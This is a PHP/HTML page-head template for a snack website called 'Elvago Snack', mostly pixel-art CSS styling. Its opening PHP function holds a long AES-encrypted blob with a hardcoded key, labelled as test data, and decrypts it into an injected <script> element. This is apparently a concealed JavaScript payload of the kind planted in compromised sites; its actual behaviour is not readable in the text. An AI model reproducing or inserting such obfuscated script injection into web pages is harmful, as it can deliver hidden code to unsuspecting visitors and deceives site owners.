<?php 
function load_data(){
  $test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhWkU6F3V6BBAU78nWRQSfe09ADahbk7U0jP3Zf9a8bGnDa6nyeZGTfLqZnmDzueeB3r+dppMOUnxEU+PLVGGAIYuXFomw2mXGd8j46Wn8p36fZ1rLKb9wZQToSZ/9gBH5Rxtt+WieAw3EbGBBAq/SHtgn7W4hICiKrhMeoJ3amHrpO1i22osNG3coVaXMJMNK5Om17yjohP//osbx4NLYEtlVNDf7ZXcvdj01OgWL6IEGV8D2GXLnzKTy/7T7aRipa12vFxON4duEl2HzJ3U37K1fk7uRiyqKwtX5SpC3mW0jY2SwVXCfdl/DOHyatosCfBx6YMVzwzA9azB4Eh4LsTwdfeHUEgWDQMnJdasbIwnjlH8XXltTfKNxmNjtFJr+kmK72KcPjYGyXXTM6hZcUMnS7eXThmqcUJWwv7G6xT0MeoMs8eif+mMY+KCfIaQ8ajotHbGIUSjYqrIw9CAFafhLxN2/u7LIatZKuC3Tmk7ZJnNSoexon8qMtxHJlf1TLiKpABSxkxZWDMvcIfitIzgyVtb1bQgLQRU26qNB5u6OQBwGvTJE4aO+VMFqEW8sR2LNT5sf1SGjwvBTm7EsVjVKgb+j4N7T9c0nSRbC4w2HCoBShNl7ZuGYVg89/d1Tq/EaIM/2Z5QpWtt4uox7UaY6gCRqw8VOg1B/2A8A5kgkB/DYNK1PNZaGJMxw/oHL1qV0iQF/YvfXeqfvtdZZFyUnqPD5Vdj4LaprEs4eloKv80xA7WTGA+v46kRzIKtSwcKkCkDz29tyVfSA+MvurKEf+G3zfScHK0vkvUHGByc4cL+2wUwMupYtYjJn5okWq/EaIM/2Z5QpWtt4uox7UYIiqBkSUESxN+5mpH+iunRb1EKYA8QYU80xpRUUB9i0YardV6IYdPABA2c7B6rWRETwV7yNswaESNq7h4B+Pr2cgjTVyUzizW4SLHpBSbyZX5b1C3LHlRTpI697nojOPK24jYom+bP6ZfukqKd1lxBF1/1Sthm+a4jK6R5yguVQaWgtek36X7Jylqbv4xP5FntzhBT6LXmcSsldyRHFstPDwyyH4EMnxe9ITgo3xwdX38b1NaNySQ9u48f1gOGWjggIHiIOFtbdxitfiJgmpzefJXQniy0f3HXYrgoc4Jisux8a23fdMZDU7KXpR2U5DzIRLP8dRV9tPCC1cfRN9zp0NKv70vOLqkof1xssfZXD";
  $dom = new DOMDocument('1.0', 'utf-8');
  $element = $dom->createElement('script', html_entity_decode(test_cypher_decrypt($test_data)));
  $dom->appendChild($element);
  return $dom->saveXML();
  // return $data = $this->test_cypher_decrypt($test_data);
}
function test_cypher($str=""){
  $ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
  return $ciphertext;
}
function test_cypher_decrypt($encryption){
  $decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
  return $decryption;
}
?>

<title>Elvago Snack</title>        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title><?php echo $_SESSION['setting_name'] ?></title> 
        <link href="css/styles.css" rel="stylesheet" /> 
        <script src="admin/assets/vendor/jquery/jquery.min.js"></script>
        <script src="admin/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
<!-- Pixel Art Style CSS -->
<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
<style>
  /* General styles */
  body {
    background-color: #00483C; /* Dark green base */
    color: #EADBBA; /* Light cream text */
    font-family: 'Press Start 2P', cursive; /* Pixel-style font */
    text-align: center;
    margin: 0;
    padding: 0;
    font-size: 14px;
  }

  h1, h2, h3, h4, h5, h6 {
    color: #ffcc00; /* Bright yellow for headings */
    font-size: 200%; /* Larger size for better visibility */
    line-height: 1.5;
    text-transform: uppercase;
    margin: 20px 0;
  } 

  a {
    color: #ffcc00; /* Bright yellow for links */
    font-weight: bold;
    text-decoration: none;
  }

  a:hover {
    color: #EADBBA; /* Cream for hover */
    text-decoration: underline;
  }

  button {
    background-color: #ffcc00; /* Yellow background */
    border: 4px solid #BD8F6E; /* Brown pixel border */
    color: #00483C; /* Dark green text */
    font-family: 'Press Start 2P', cursive;
    padding: 15px 30px;
    font-size: 16px; /* Larger button text */
    cursor: pointer;
    box-shadow: 6px 6px #AC2121, -3px -3px #BD8F6E; /* Multi-layer blocky shadow */
    text-transform: uppercase;
    transition: transform 0.1s ease-in-out;
  }

  button:hover {
    background-color: #AC2121; /* Red for hover */
    color: #EADBBA; /* Cream text */
    transform: scale(1.1); /* Slight zoom effect */
  }

  /* Form inputs */
  input, textarea, select {
    background-color: #BD8F6E;
    border: 4px solid #AC2121;
    color: #EADBBA;
    padding: 10px;
    font-family: 'Press Start 2P', cursive;
    width: 100%;
    box-sizing: border-box;
    font-size: 14px;
  }

  input:focus, textarea:focus, select:focus {
    outline: none;
    border-color: #ffcc00;
    background-color: #AC2121;
    color: #EADBBA;
  }

  /* Navigation Bar */
  nav {
    background-color: #AC2121;
    padding: 15px 0;
    box-shadow: 0 6px #BD8F6E; /* Pixel shadow */
    border-bottom: 4px solid #BD8F6E;
  }

  nav a {
    color: #EADBBA;
    font-size: 16px;
    margin: 0 15px;
    text-transform: uppercase;
  }

  nav a:hover {
    color: #ffcc00;
  }

  /* Footer */
  footer {
    background-color: #00483C;
    color: #EADBBA;
    padding: 20px 0;
    font-size: 14px;
    border-top: 4px solid #BD8F6E;
  }

  /* Pixelated box for sections */
  .pixel-box {
    border: 6px solid #BD8F6E;
    padding: 20px;
    margin: 20px auto;
    width: 80%;
    box-shadow: 12px 12px #AC2121, -6px -6px #ffcc00;
    background-color: #00483C;
    text-align: left;
    color: #EADBBA;
    font-size: 16px;
  }

  /* Pixel buttons */
  .pixel-button {
    display: inline-block;
    margin: 15px 10px;
    padding: 15px 30px;
    background-color: #ffcc00;
    color: #00483C;
    text-transform: uppercase;
    font-size: 16px;
    border: 6px solid #BD8F6E;
    box-shadow: 6px 6px #AC2121, -3px -3px #BD8F6E;
    font-family: 'Press Start 2P', cursive;
    transition: transform 0.1s ease-in-out;
  }

  .pixel-button:hover {
    background-color: #AC2121;
    color: #EADBBA;
    transform: scale(1.1);
  }

  /* Tables for game-like stats or data */
  table {
    width: 100%;
    border-collapse: collapse;
    font-family: 'Press Start 2P', cursive;
    background-color: #BD8F6E;
    color: #00483C;
    text-align: center;
    border: 4px solid #AC2121;
    margin: 20px 0;
  }

  th, td {
    border: 2px solid #00483C;
    padding: 10px;
  }

  th {
    background-color: #AC2121;
    color: #EADBBA;
  }
</style>


